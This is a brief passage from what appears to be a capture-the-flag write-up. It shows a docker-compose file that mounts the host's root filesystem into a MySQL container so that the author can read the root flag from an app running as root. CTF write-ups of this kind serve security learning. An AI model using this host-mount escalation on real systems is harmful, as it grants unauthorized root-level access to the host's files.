Unfortunately the only vuln found is regarding the use of the application being an unauthenticated user with a middleware. that is not helfpul for us.

Seems that the app is being executed by the root user so we should be able to mount the path `/` in the container and then extract the root flag.
 ```yaml
 services:
	vuln1:
		image: mysql:latest
		container_name: vuln1
		env_file:
		- .env
		ports:
		- "3306:3306"
		volumes:
		- /:/home
		restart: unless-stopped
 ```

with this we were able to get the `root.txt` flag.
